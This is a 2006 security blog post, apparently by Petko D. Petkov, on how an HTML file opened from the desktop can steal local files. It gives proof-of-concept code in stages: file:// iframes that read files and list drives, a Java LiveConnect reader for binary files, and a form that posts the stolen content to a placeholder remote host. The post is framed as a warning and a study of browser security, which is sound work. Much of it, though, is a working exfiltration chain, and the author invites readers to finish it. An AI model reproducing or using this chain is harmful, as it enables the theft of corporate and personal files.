---
title: Web Pages from Hell
author: petko-d-petkov
date: Mon, 11 Sep 2006 21:23:31 GMT
template: this/views/post.jade
---

You open a html file but you are not aware. You check the content but you don't know.

> I have just received the report for the third quoter of 2006 by email. My boss says that from now on we will use simple html pages because it is more accessible. Well, I don't know much about accessibility and I don't really care. I click on the attachment. The html document stores itself no the desktop. Double click and I have it open in Firefox.

What happens next is without any doubt a security breach. Anonymous attacker has just compromised and stole important corporate documents.

Unfortunately, this story is far from being far-fetched. This is something that can happen to your organization and the technology required is here today and ready for use. Concerning, isn't it? That's the reason why I went a bit deeper into this topic, figuring out various attack vectors and composing a simple toolkit to mitigate the risk. The following post reveals some of my findings and provides disjointed source code as a proof of concept.

In this example we need Java, a single iframe, a form and a remote storage point. The iframe is used as data retrieval mechanism for html, xml and text files. Java is used as data retrieval mechanism for binary files. The form is used to send the data back to a remote storage point in a form of multiple POST request.

The first stage is to compose an iframe. You must be aware that iframes are areas where content can be rendered. This content is retrieved by a URL. The URL describes the location and also the protocol in use, which can be `HTTP, HTTPS, FTP, FILE` and maybe something else depending of your browser. Obviously `FILE` sounds quite interesting. This protocol allows us to look and browse through our system or open local files inside our browsers. Just entering `file:///C:/` in your browser window should open `C:\` drive.

It is said that iframes are secured in a way that different domains cannot access each other content. This restriction is applied with the same origin model. In simple terms, if a page from `a.com` creates hidden iframe of `b.com`, no communication is allowed between them. This means that` a.com` cannot read what is inside `b.com` iframe.

In a way this is secure, however the `FILE` protocol is excluded from this rule simply because file paths don't have domains. So, an html file loaded from `file:///C:/file.html` can open an iframe of `file:///D:/file.html` and read its content. Of course, it must be noted that no external resource can read files from the local system because the same origin model imply that the protocol must be the same in order to allow communication. This means that HTTP cannot communicate with FILE or FTP.

To cut the story short I will go into an example how all this theory can be used in practice.

A file on the file system can open any other file inside an iframe.

```html
<iframe src="file:///C:/test.txt"></iframe>
```

In order to retrieve the content of this file we have to wait for the iframe to load and then just grab its document body.

```html
<iframe src="file:///C:/test.txt" onload="getContent(this)"></iframe>
<script>
  function getContent(iframe) {
    var content = '';
    if (iframe.contentDocument) {
      content = iframe.contentDocument.body.innerHTML; 
    } else if (iframe.contentWindow) {
      content = iframe.contentWindow.document.body.innerHTML;
    } else if (iframe.document) {
      content = iframe.document.body.innerHTML;
    }
    alert(content);
  }
</script>
```

The snippet above will display the content of an iframe which currently holds `file:///C:/test.txt`.

Opening files is not fun although probably you already can see some of the potentials. Let's try something more funky by replacing `file:///C:/test.txt` with `file:///C:/.` This should open `C:\` drive.

```html
<iframe src="file:///C:/" onload="getContent(this)"></iframe>
<script>
  function getContent(iframe) {
    var content = '';
    if (iframe.contentDocument) {
      content = iframe.contentDocument.body.innerHTML; 
    } else if (iframe.contentWindow) {
      content = iframe.contentWindow.document.body.innerHTML;
    } else if (iframe.document) {
      content = iframe.document.body.innerHTML;
    }
    alert(content);
  }
</script>
```

Potentially, the snippet above has just listed your `C:\` drive into an alert box. Of course this will work on most browsers but not in IE. IE is secure in this respect, however just keep in mind that IE supports ActiveX which makes the entire process a lot more simpler in some situations.

The next step every attacker probably will do is to create a recursive function which lists directories and upload interesting content on a remote server. If you try to do this you will see that the process is not as trivial as it seams because as soon as your iframe tries to open a binary file, your browser will prompt you with a download box. Of course, the attacker can try to avoid doc, xls and other types of binary files but today this is where all interesting corporate information is stored into.

So, in order to retrieve a binary file another technology needs to be used: Java and more precisely LiveConnect which is supported by Firefox and Opera. Let's see how our binary retrieving code looks like:

```html
<script>
  function liveJaveGetContent(URL) {
    var result = '';
    var destination = new java.net.URL(URL);
    var input = java.io.DataInputStream(destination.openStream());

    while ((line = input.readLine()) != null) {
      result += line;
      result += java.lang.System.getProperty('line.separator');
    }

    input.close();
    return result;
  }
</script>
```

I must admit that the code above is not as generic as it can be but... well, no time.

So, the function above can read binary files and return them in form of a string. This string is quite valuable for the attackers but first it has to be send to a remote location. This can be achieved in many ways, however my favorite one requires something as simple as a html form.

```html
<form name="sendContentForm" method="post" action="http://path/to/remote/location">
  <textarea name="content"></textarea>
  <input type="submit"/>
</form>
```

This is it. When we call `sendContentFrom.submit()` the data will be transfered from locahost to the remote location. Of course this form wont be able to transport too much content. For that reason we have to do some partitioning and send the data in blocks.I will let this to you to play around.

The conclusion is that you should not trust anything that you open in your browser, unless you completely disable JavaScrpt, Java and Flash. The next time you open a simple html page from your desktop, keep in mind that you may have opened a security hole in your network too. While previewing the document the attacker is able to enumerate the internal infrastructure of your organization by listing mounted shares. These share may contain documents, tables and databases that might be valuable to some individuals and organizations.

_BTW, just closing the browser window wont stop this attack continuing in the background. Many browsers can be made to stay alive even after you click on the X button. Maybe I will cover this some other time._
